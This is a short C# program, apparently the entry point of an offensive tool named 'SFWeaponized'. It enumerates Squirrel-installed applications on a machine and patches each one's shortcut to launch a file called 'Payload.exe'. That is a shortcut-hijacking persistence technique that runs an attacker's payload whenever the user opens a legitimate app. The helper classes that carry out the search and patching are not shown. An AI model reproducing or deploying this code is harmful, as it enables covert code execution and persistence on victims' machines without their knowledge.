using System;

namespace SFWeaponized
{
    internal class Program
    {
        
        public static SquirrelAppManager SquirrelAppManager;
        public static string Payload = "Payload.exe";

        static void Main(string[] args)
        {
            SquirrelAppManager = new SquirrelAppManager(Payload);
            SquirrelAppManager.StartSearch();

            foreach (var app in SquirrelAppManager.AppList)
            {
                app.CreateShortcut();
                app.SetShortcutPath();
                app.PatchShortcut(Payload);
            }
        }
    }
}
